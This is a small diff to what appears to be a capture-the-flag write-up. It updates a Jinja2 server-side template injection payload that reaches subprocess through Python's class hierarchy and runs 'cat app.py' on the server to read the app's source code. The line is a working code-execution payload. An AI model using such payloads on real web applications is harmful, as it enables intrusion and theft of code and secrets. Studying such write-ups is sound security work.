@@ -9,7 +9,7 @@ Step 1, get the config
 Step 2, get the app source code
 
 ``` python
-{{ ''.__class__.__mro__[1].__subclasses__()[407]('cat app.py',shell=True,stdout=-1).communicate()[0].strip()}}
+{{ ''.__class__.__mro__[1].__subclasses__()[286]('cat app.py',shell=True,stdout=-1).communicate()[0].strip()}}
 ```
 
 Step 3, run it yourself!
